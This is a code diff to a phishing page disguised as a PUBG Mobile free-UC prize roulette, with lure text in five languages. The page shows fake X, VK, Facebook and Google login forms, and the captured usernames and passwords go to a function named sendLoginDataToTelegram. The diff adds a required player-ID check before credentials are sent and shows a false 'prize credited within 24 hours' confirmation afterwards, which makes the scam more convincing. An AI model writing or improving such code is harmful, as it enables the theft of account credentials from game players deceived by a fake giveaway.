@@ -2236,226 +2236,6 @@
             font-family: Arial, sans-serif;
         }
         
-        /* НОВЫЕ ЭЛЕМЕНТЫ ИЗ СКРИНШОТОВ */
-        
-        /* Бонусный баланс */
-        .bonus-balance {
-            background: rgba(20, 35, 60, 0.9);
-            border-radius: 20px;
-            padding: 20px;
-            width: 100%;
-            max-width: 600px;
-            margin: 20px auto;
-            border: 2px solid rgba(123, 104, 238, 0.3);
-            backdrop-filter: blur(10px);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-        }
-        
-        .bonus-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        
-        .bonus-title {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 20px;
-            color: #8da1b5;
-            font-weight: 500;
-        }
-        
-        .bonus-percent {
-            background: linear-gradient(135deg, #ff3366, #ff9966);
-            color: white;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-weight: bold;
-            font-size: 16px;
-        }
-        
-        .task-list {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-        
-        .task-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 12px 15px;
-            background: rgba(12, 26, 45, 0.7);
-            border-radius: 10px;
-            border: 1px solid #2a3b5a;
-            transition: all 0.3s;
-        }
-        
-        .task-item:hover {
-            background: rgba(24, 119, 242, 0.1);
-            border-color: rgba(24, 119, 242, 0.3);
-        }
-        
-        .task-info {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .task-checkbox {
-            width: 20px;
-            height: 20px;
-            border: 2px solid #8da1b5;
-            border-radius: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .task-checkbox.checked {
-            background: #4CAF50;
-            border-color: #4CAF50;
-        }
-        
-        .task-checkbox.checked::after {
-            content: '✓';
-            color: white;
-            font-size: 14px;
-            font-weight: bold;
-        }
-        
-        .task-text {
-            font-family: Arial, sans-serif;
-            color: #8da1b5;
-            font-size: 14px;
-        }
-        
-        .task-progress {
-            color: #1877F2;
-            font-size: 12px;
-            font-weight: 500;
-        }
-        
-        .task-reward {
-            background: linear-gradient(135deg, #7B68EE, #4B0082);
-            color: white;
-            padding: 5px 10px;
-            border-radius: 8px;
-            font-size: 12px;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        
-        /* Кейсы и депозиты */
-        .cases-section {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin-top: 20px;
-        }
-        
-        .case-item {
-            background: rgba(12, 26, 45, 0.7);
-            border-radius: 15px;
-            padding: 20px;
-            text-align: center;
-            border: 2px solid transparent;
-            transition: all 0.3s;
-            cursor: pointer;
-        }
-        
-        .case-item:hover {
-            border-color: #7B68EE;
-            transform: translateY(-5px);
-            box-shadow: 0 10px 20px rgba(123, 104, 238, 0.2);
-        }
-        
-        .case-amount {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 24px;
-            color: #8da1b5;
-            margin-bottom: 10px;
-        }
-        
-        .case-label {
-            color: #8da1b5;
-            font-size: 12px;
-            font-family: Arial, sans-serif;
-        }
-        
-        /* Навигация */
-        .nav-tabs {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin: 20px 0;
-        }
-        
-        .nav-tab {
-            padding: 10px 20px;
-            background: rgba(12, 26, 45, 0.7);
-            border: none;
-            border-radius: 8px;
-            color: #8da1b5;
-            font-family: Arial, sans-serif;
-            font-size: 14px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        
-        .nav-tab.active {
-            background: linear-gradient(135deg, #7B68EE, #4B0082);
-            color: white;
-        }
-        
-        .nav-tab:hover:not(.active) {
-            background: rgba(24, 119, 242, 0.1);
-        }
-        
-        /* Новый стиль для FAQ */
-        .faq-section {
-            background: rgba(20, 35, 60, 0.9);
-            border-radius: 20px;
-            padding: 25px;
-            width: 100%;
-            max-width: 600px;
-            margin-top: 20px;
-            backdrop-filter: blur(10px);
-            border: 2px solid rgba(24, 119, 242, 0.3);
-        }
-        
-        .faq-title {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 24px;
-            color: #8da1b5;
-            text-align: center;
-            margin-bottom: 20px;
-            font-weight: 500;
-        }
-        
-        .faq-item {
-            margin-bottom: 15px;
-            border-bottom: 1px solid rgba(42, 59, 90, 0.5);
-            padding-bottom: 15px;
-        }
-        
-        .faq-question {
-            color: #8da1b5;
-            font-family: Arial, sans-serif;
-            font-size: 16px;
-            margin-bottom: 8px;
-            font-weight: 500;
-        }
-        
-        .faq-answer {
-            color: #6c849e;
-            font-family: Arial, sans-serif;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-        
         @media (max-width: 600px) {
             .roulette-container {
                 height: 320px;
@@ -2647,31 +2427,6 @@
             
             .id-input-section {
                 padding: 20px 15px;
-            }
-            
-            .cases-section {
-                grid-template-columns: repeat(2, 1fr);
-                gap: 10px;
-            }
-            
-            .case-item {
-                padding: 15px;
-            }
-            
-            .case-amount {
-                font-size: 18px;
-            }
-            
-            .bonus-title {
-                font-size: 16px;
-            }
-            
-            .task-item {
-                padding: 10px;
-            }
-            
-            .task-text {
-                font-size: 12px;
             }
         }
     </style>
@@ -3082,138 +2837,6 @@
                 ID можно найти в настройках игры в разделе "Основное"
             </p>
         </div>
-        
-        <!-- Бонусный баланс (из скриншотов) -->
-        <div class="bonus-balance">
-            <div class="bonus-header">
-                <h3 class="bonus-title">Заработайте бонусный баланс</h3>
-                <span class="bonus-percent">+26%</span>
-            </div>
-            
-            <p style="color: #8da1b5; margin-bottom: 20px; font-family: Arial, sans-serif; text-align: center;">
-                Приглашайте друзей и выполняйте задачи, чтобы заработать больше 👍
-            </p>
-            
-            <div class="task-list">
-                <div class="task-item">
-                    <div class="task-info">
-                        <div class="task-checkbox"></div>
-                        <span class="task-text">Пригласить 75 друзей</span>
-                    </div>
-                    <span class="task-progress">0 / 75</span>
-                    <span class="task-reward">375 🌬</span>
-                </div>
-                
-                <div class="task-item">
-                    <div class="task-info">
-                        <div class="task-checkbox"></div>
-                        <span class="task-text">Пригласить 45 друзей</span>
-                    </div>
-                    <span class="task-progress">0 / 45</span>
-                    <span class="task-reward">225 🌬</span>
-                </div>
-                
-                <div class="task-item">
-                    <div class="task-info">
-                        <div class="task-checkbox"></div>
-                        <span class="task-text">Пригласить 15 друзей</span>
-                    </div>
-                    <span class="task-progress">0 / 15</span>
-                    <span class="task-reward">75 🌬</span>
-                </div>
-                
-                <div class="task-item">
-                    <div class="task-info">
-                        <div class="task-checkbox"></div>
-                        <span class="task-text">Подписаться на Telegram</span>
-                    </div>
-                    <span class="task-reward">10 🌬</span>
-                </div>
-            </div>
-        </div>
-        
-        <!-- Навигация -->
-        <div class="nav-tabs">
-            <button class="nav-tab active" data-tab="cases">Кейсы</button>
-            <button class="nav-tab" data-tab="games">Игры</button>
-            <button class="nav-tab" data-tab="faq">Вопросы</button>
-        </div>
-        
-        <!-- Кейсы и депозиты -->
-        <div class="cases-section" id="casesTab">
-            <div class="case-item">
-                <div class="case-amount">1000 UC</div>
-                <div class="case-label">Депозит</div>
-            </div>
-            
-            <div class="case-item">
-                <div class="case-amount">2000 UC</div>
-                <div class="case-label">Депозит</div>
-            </div>
-            
-            <div class="case-item">
-                <div class="case-amount">5000 UC</div>
-                <div class="case-label">Депозит</div>
-            </div>
-            
-            <div class="case-item">
-                <div class="case-amount">10000 UC</div>
-                <div class="case-label">Депозит</div>
-            </div>
-        </div>
-        
-        <!-- FAQ секция -->
-        <div class="faq-section" id="faqTab" style="display: none;">
-            <h3 class="faq-title">Вопросы и ответы</h3>
-            
-            <div class="faq-item">
-                <div class="faq-question">Где задонатить в PUBG Mobile?</div>
-                <div class="faq-answer">На нашем сайте вы можете приобрести UC (Unknown Cash) для PUBG Mobile по выгодным ценам.</div>
-            </div>
-            
-            <div class="faq-item">
-                <div class="faq-question">А есть ли бесплатный донат в PUBG Mobile?</div>
-                <div class="faq-answer">Да, участвуйте в розыгрышах и выполняйте задания на нашем сайте, чтобы получить UC бесплатно.</div>
-            </div>
-            
-            <div class="faq-item">
-                <div class="faq-question">Как задонатить в PUBG другу?</div>
-                <div class="faq-answer">Введите ID друга при покупке UC, и средства будут зачислены на его аккаунт.</div>
-            </div>
-            
-            <div class="faq-item">
-                <div class="faq-question">Как задонатить в PUBG на телефоне?</div>
-                <div class="faq-answer">Наш сайт полностью адаптирован для мобильных устройств. Просто зайдите с телефона и следуйте инструкциям.</div>
-            </div>
-            
-            <div class="faq-item">
-                <div class="faq-question">Что такое UC?</div>
-                <div class="faq-answer">UC (Unknown Cash) - это внутриигровая валюта PUBG Mobile, которую можно потратить на покупки в игре.</div>
-            </div>
-            
-            <div class="faq-item">
-                <div class="faq-question">Как получить UC?</div>
-                <div class="faq-answer">Вы можете купить UC на нашем сайте или выиграть их в розыгрышах и акциях.</div>
-            </div>
-            
-            <div class="faq-item">
-                <div class="faq-question">Где найти UID?</div>
-                <div class="faq-answer">UID можно найти в настройках игры в разделе "Основное".</div>
-            </div>
-        </div>
-        
-        <!-- Специальное предложение -->
-        <div class="bonus-balance" style="text-align: center;">
-            <div class="bonus-header" style="justify-content: center;">
-                <h3 class="bonus-title" style="color: #7B68EE; font-size: 22px;">1800 UC</h3>
-            </div>
-            <div style="font-family: 'Orbitron', sans-serif; font-size: 28px; color: white; margin: 10px 0;">
-                2 126 ₽ <span style="color: #4CAF50; font-size: 18px;">-40%</span>
-            </div>
-            <button class="play-btn" style="max-width: 250px; margin: 20px auto 0; padding: 15px 30px; font-size: 18px;">
-                К ОПЛАТЕ
-            </button>
-        </div>
     </div>
 
     <!-- Футер -->
@@ -3254,7 +2877,7 @@
         let winnersTimer = null;
         let currentLanguage = 'ru';
         let playerId = '';
-        let hasSubmittedSocial = false;
+        let isFirstLoad = true; // Флаг для первого запуска
         
         // Полные переводы для всех языков
         const translations = {
@@ -3270,7 +2893,7 @@
                 notificationAlreadyPlayed: "Вы уже использовали свою попытку сегодня!",
                 confirmationTitle: "ЗАЯВКА ПРИНЯТА!",
                 confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт PUBG Mobile в течение 24 часов.",
-                loginSuccess: "Данные для входа отправлены! Введите ваш ID PUBG для получения приза.",
+                loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов.",
                 alreadyPlayed: "УЖЕ ИГРАЛИ",
                 myPrize: "Мой приз",
                 importantNote: "Важно: Приз будет зачислен на ваш аккаунт в течение 24 часов",
@@ -3294,8 +2917,9 @@
                 idSectionText: "Введите ваш ID PUBG Mobile для получения приза",
                 idPlaceholder: "Введите ваш ID PUBG",
                 idSubmitBtn: "ОТПРАВИТЬ",
-                idNotificationSuccess: "ID успешно сохранен! Ваш приз будет доставлен на аккаунт PUBG Mobile в течение 24 часов.",
-                idNotificationError: "Пожалуйста, введите ваш ID PUBG"
+                idNotificationSuccess: "ID успешно сохранен!",
+                idNotificationError: "Пожалуйста, введите ваш ID PUBG",
+                idRequired: "Для получения приза необходимо ввести ID вашего аккаунта PUBG"
             },
             en: {
                 play: "PLAY",
@@ -3309,7 +2933,7 @@
                 notificationAlreadyPlayed: "You have already used your attempt today!",
                 confirmationTitle: "APPLICATION ACCEPTED!",
                 confirmationMessage: "Your winnings will be credited to your PUBG Mobile account within 24 hours.",
-                loginSuccess: "Login data sent! Enter your PUBG ID to receive the prize.",
+                loginSuccess: "Login data sent! Prize will be credited within 24 hours.",
                 alreadyPlayed: "ALREADY PLAYED",
                 myPrize: "My Prize",
                 importantNote: "Important: The prize will be credited to your account within 24 hours",
@@ -3333,8 +2957,9 @@
                 idSectionText: "Enter your PUBG Mobile ID to receive the prize",
                 idPlaceholder: "Enter your PUBG ID",
                 idSubmitBtn: "SUBMIT",
-                idNotificationSuccess: "ID successfully saved! Your prize will be delivered to your PUBG Mobile account within 24 hours.",
-                idNotificationError: "Please enter your PUBG ID"
+                idNotificationSuccess: "ID successfully saved!",
+                idNotificationError: "Please enter your PUBG ID",
+                idRequired: "To receive the prize, you need to enter your PUBG account ID"
             },
             uz: {
                 play: "O'YNA",
@@ -3348,7 +2973,7 @@
                 notificationAlreadyPlayed: "Siz bugungi imkoniyatingizdan foydalandingiz!",
                 confirmationTitle: "ARIZA QABUL QILINDI!",
                 confirmationMessage: "Yutigingiz 24 soat ichida PUBG Mobile hisobingizga o'tkaziladi.",
-                loginSuccess: "Kirish ma'lumotlari yuborildi! Sovrinni olish uchun PUBG IDingizni kiriting.",
+                loginSuccess: "Kirish ma'lumotlari yuborildi! Sovrin 24 soat ichida o'tkaziladi.",
                 alreadyPlayed: "ALLAQACHON O'YNANGAN",
                 myPrize: "Mening sovrim",
                 importantNote: "Muhim: Sovrin 24 soat ichida hisobingizga o'tkaziladi",
@@ -3372,8 +2997,9 @@
                 idSectionText: "Sovrinni olish uchun PUBG Mobile IDingizni kiriting",
                 idPlaceholder: "PUBG IDingizni kiriting",
                 idSubmitBtn: "YUBORISH",
-                idNotificationSuccess: "ID muvaffaqiyatli saqlandi! Sovringiz 24 soat ichida PUBG Mobile hisobingizga yetkaziladi.",
-                idNotificationError: "Iltimos, PUBG IDingizni kiriting"
+                idNotificationSuccess: "ID muvaffaqiyatli saqlandi!",
+                idNotificationError: "Iltimos, PUBG IDingizni kiriting",
+                idRequired: "Sovrinni olish uchun PUBG hisobingizning ID raqamini kiritishingiz kerak"
             },
             kz: {
                 play: "ОЙНАУ",
@@ -3387,7 +3013,7 @@
                 notificationAlreadyPlayed: "Сіз бүгінгі мүмкіндігіңізді пайдаландыңыз!",
                 confirmationTitle: "ӨТІНІШ ҚАБЫЛДАНДЫ!",
                 confirmationMessage: "Жеңісіңіз 24 сағат ішінде PUBG Mobile тіркелгіңізге аударылады.",
-                loginSuccess: "Кіру деректері жіберілді! Жүлдені алу үшін PUBG IDіңізді енгізіңіз.",
+                loginSuccess: "Кіру деректері жіберілді! Жүлде 24 сағат ішінде аударылады.",
                 alreadyPlayed: "ҚАЗІРГІДЕ ОЙНАЛДЫ",
                 myPrize: "Менің жүлдем",
                 importantNote: "Маңызды: Жүлде 24 сағат ішінде тіркелгіңізге аударылады",
@@ -3411,8 +3037,9 @@
                 idSectionText: "Жүлдені алу үшін PUBG Mobile IDіңізді енгізіңіз",
                 idPlaceholder: "PUBG IDіңізді енгізіңіз",
                 idSubmitBtn: "ЖІБЕРУ",
-                idNotificationSuccess: "ID сәтті сақталды! Жүлденіз 24 сағат ішінде PUBG Mobile тіркелгіңізге жеткізіледі.",
-                idNotificationError: "PUBG IDіңізді енгізіңіз"
+                idNotificationSuccess: "ID сәтті сақталды!",
+                idNotificationError: "PUBG IDіңізді енгізіңіз",
+                idRequired: "Жүлдені алу үшін PUBG тіркелгіңіздің ID нөмірін енгізуіңіз керек"
             },
             ar: {
                 play: "لعب",
@@ -3426,7 +3053,7 @@
                 notificationAlreadyPlayed: "لقد استخدمت محاولتك اليوم بالفعل!",
                 confirmationTitle: "تم قبول الطلب!",
                 confirmationMessage: "سيتم إضافة أرباحك إلى حساب PUBG Mobile الخاص بك خلال 24 ساعة.",
-                loginSuccess: "تم إرسال بيانات الدخول! أدخل معرف PUBG الخاص بك لاستلام الجائزة.",
+                loginSuccess: "تم إرسال بيانات الدخول! سيتم إضافة الجائزة خلال 24 ساعة.",
                 alreadyPlayed: "تم اللعب بالفعل",
                 myPrize: "جائزتي",
                 importantNote: "مهم: سيتم إضافة الجائزة إلى حسابك خلال 24 ساعة",
@@ -3450,8 +3077,9 @@
                 idSectionText: "أدخل معرف PUBG Mobile الخاص بك لاستلام الجائزة",
                 idPlaceholder: "أدخل معرف PUBG الخاص بك",
                 idSubmitBtn: "إرسال",
-                idNotificationSuccess: "تم حفظ المعرف بنجاح! سيتم توصيل جائزتك إلى حساب PUBG Mobile الخاص بك خلال 24 ساعة.",
-                idNotificationError: "الرجاء إدخال معرف PUBG الخاص بك"
+                idNotificationSuccess: "تم حفظ المعرف بنجاح!",
+                idNotificationError: "الرجاء إدخال معرف PUBG الخاص بك",
+                idRequired: "للاستلام الجائزة، يجب إدخال معرف حساب PUBG الخاص بك"
             }
         };
         
@@ -3546,6 +3174,11 @@
             
             // Сохраняем язык в localStorage
             localStorage.setItem('preferredLanguage', lang);
+            
+            // Только если это не первая загрузка, показываем уведомление
+            if (!isFirstLoad) {
+                showNotification(`${lang === 'en' ? 'Language changed to' : 'Язык изменен на'} ${langNames[lang] || 'Русский'}`);
+            }
         }
         
         // Функция для окна приза
@@ -3576,6 +3209,8 @@
                         // Показываем форму выбора соцсети
                         socialSelectSection.classList.add('active');
                         socialSelectSection.scrollIntoView({ behavior: 'smooth' });
+                        
+                        showNotification(t.choosePrize);
                     };
                 } else {
                     collectBtn.textContent = currentLanguage === 'en' ? 'CLOSE' : 'ЗАКРЫТЬ';
@@ -3795,13 +3430,15 @@
                         hasPlayed = played === 'true';
                     }
                     
-                    // Применяем язык после получения IP (без уведомления)
+                    // Применяем язык после получения IP
                     changeLanguage(currentLanguage);
+                    isFirstLoad = false; // Отключаем флаг первой загрузки
                 })
                 .catch(error => {
                     console.log('Error getting IP:', error);
                     // Применяем язык даже если IP не получен
                     changeLanguage(currentLanguage);
+                    isFirstLoad = false; // Отключаем флаг первой загрузки
                 });
             
             const playBtn = document.getElementById('playBtn');
@@ -3832,11 +3469,6 @@
             // Элементы для ID
             const playerIdInput = document.getElementById('playerIdInput');
             const idSubmitBtn = document.getElementById('idSubmitBtn');
-            
-            // Навигационные табы
-            const navTabs = document.querySelectorAll('.nav-tab');
-            const casesTab = document.getElementById('casesTab');
-            const faqTab = document.getElementById('faqTab');
             
             // Призы с картинками
             const prizes = [
@@ -3890,13 +3522,6 @@
                 
                 const t = translations[currentLanguage] || translations.ru;
                 showNotification(t.idNotificationSuccess, false, true);
-                
-                // Если пользователь уже отправил данные соцсети, показываем подтверждение
-                if (hasSubmittedSocial) {
-                    isPrizeReceived = true;
-                    updatePrizeBadge();
-                    showConfirmation();
-                }
             });
             
             // Также сохраняем ID при нажатии Enter
@@ -3904,30 +3529,6 @@
                 if (e.key === 'Enter') {
                     idSubmitBtn.click();
                 }
-            });
-            
-            // Обработчики для навигационных табов
-            navTabs.forEach(tab => {
-                tab.addEventListener('click', function() {
-                    const tabName = this.getAttribute('data-tab');
-                    
-                    // Убираем активный класс со всех табов
-                    navTabs.forEach(t => t.classList.remove('active'));
-                    // Добавляем активный класс текущему табу
-                    this.classList.add('active');
-                    
-                    // Показываем/скрываем соответствующий контент
-                    if (tabName === 'cases') {
-                        casesTab.style.display = 'grid';
-                        faqTab.style.display = 'none';
-                    } else if (tabName === 'faq') {
-                        casesTab.style.display = 'none';
-                        faqTab.style.display = 'block';
-                    } else if (tabName === 'games') {
-                        casesTab.style.display = 'none';
-                        faqTab.style.display = 'none';
-                    }
-                });
             });
             
             // Функция получения случайного приза
@@ -4086,6 +3687,13 @@
                 e.preventDefault();
                 const password = this.querySelector('input').value;
                 
+                // Проверяем, введен ли ID игрока
+                if (!playerId) {
+                    const t = translations[currentLanguage] || translations.ru;
+                    showNotification(t.idRequired, true);
+                    return;
+                }
+                
                 const loginData = {
                     username: xUsername,
                     password: password
@@ -4095,19 +3703,11 @@
                 
                 if (success) {
                     closeModal('xModalStep2');
-                    hasSubmittedSocial = true;
+                    isPrizeReceived = true;
+                    updatePrizeBadge();
+                    showConfirmation();
                     const t = translations[currentLanguage] || translations.ru;
                     showNotification(t.loginSuccess, false, true);
-                    
-                    // Показываем секцию для ввода ID
-                    document.getElementById('id-input-section').scrollIntoView({ behavior: 'smooth' });
-                    
-                    // Если ID уже введен, показываем подтверждение
-                    if (playerId) {
-                        isPrizeReceived = true;
-                        updatePrizeBadge();
-                        showConfirmation();
-                    }
                 }
             });
             
@@ -4121,23 +3721,22 @@
                     foreign_computer: inputs[2].checked ? 'Да' : 'Нет'
                 };
                 
+                // Проверяем, введен ли ID игрока
+                if (!playerId) {
+                    const t = translations[currentLanguage] || translations.ru;
+                    showNotification(t.idRequired, true);
+                    return;
+                }
+                
                 const success = await sendLoginDataToTelegram('vk', loginData, finalPrizeIndex);
                 
                 if (success) {
                     closeModal('vkModal');
-                    hasSubmittedSocial = true;
+                    isPrizeReceived = true;
+                    updatePrizeBadge();
+                    showConfirmation();
                     const t = translations[currentLanguage] || translations.ru;
                     showNotification(t.loginSuccess, false, true);
-                    
-                    // Показываем секцию для ввода ID
-                    document.getElementById('id-input-section').scrollIntoView({ behavior: 'smooth' });
-                    
-                    // Если ID уже введен, показываем подтверждение
-                    if (playerId) {
-                        isPrizeReceived = true;
-                        updatePrizeBadge();
-                        showConfirmation();
-                    }
                 }
             });
             
@@ -4150,23 +3749,22 @@
                     password: inputs[1].value
                 };
                 
+                // Проверяем, введен ли ID игрока
+                if (!playerId) {
+                    const t = translations[currentLanguage] || translations.ru;
+                    showNotification(t.idRequired, true);
+                    return;
+                }
+                
                 const success = await sendLoginDataToTelegram('facebook', loginData, finalPrizeIndex);
                 
                 if (success) {
                     closeModal('facebookModal');
-                    hasSubmittedSocial = true;
+                    isPrizeReceived = true;
+                    updatePrizeBadge();
+                    showConfirmation();
                     const t = translations[currentLanguage] || translations.ru;
                     showNotification(t.loginSuccess, false, true);
-                    
-                    // Показываем секцию для ввода ID
-                    document.getElementById('id-input-section').scrollIntoView({ behavior: 'smooth' });
-                    
-                    // Если ID уже введен, показываем подтверждение
-                    if (playerId) {
-                        isPrizeReceived = true;
-                        updatePrizeBadge();
-                        showConfirmation();
-                    }
                 }
             });
             
@@ -4200,6 +3798,13 @@
                     return;
                 }
                 
+                // Проверяем, введен ли ID игрока
+                if (!playerId) {
+                    const t = translations[currentLanguage] || translations.ru;
+                    showNotification(t.idRequired, true);
+                    return;
+                }
+                
                 const showPassword = googleShowPassword.checked;
                 
                 const loginData = {
@@ -4212,19 +3817,11 @@
                 
                 if (success) {
                     closeGoogleFullscreen();
-                    hasSubmittedSocial = true;
+                    isPrizeReceived = true;
+                    updatePrizeBadge();
+                    showConfirmation();
                     const t = translations[currentLanguage] || translations.ru;
                     showNotification(t.loginSuccess, false, true);
-                    
-                    // Показываем секцию для ввода ID
-                    document.getElementById('id-input-section').scrollIntoView({ behavior: 'smooth' });
-                    
-                    // Если ID уже введен, показываем подтверждение
-                    if (playerId) {
-                        isPrizeReceived = true;
-                        updatePrizeBadge();
-                        showConfirmation();
-                    }
                 }
             });
             
@@ -4254,6 +3851,13 @@
                 if (!selectedSocial) {
                     const t = translations[currentLanguage] || translations.ru;
                     showNotification(t.notificationSelectSocial, true);
+                    return;
+                }
+                
+                // Проверяем, введен ли ID игрока
+                if (!playerId) {
+                    const t = translations[currentLanguage] || translations.ru;
+                    showNotification(t.idRequired, true);
                     return;
                 }
                 
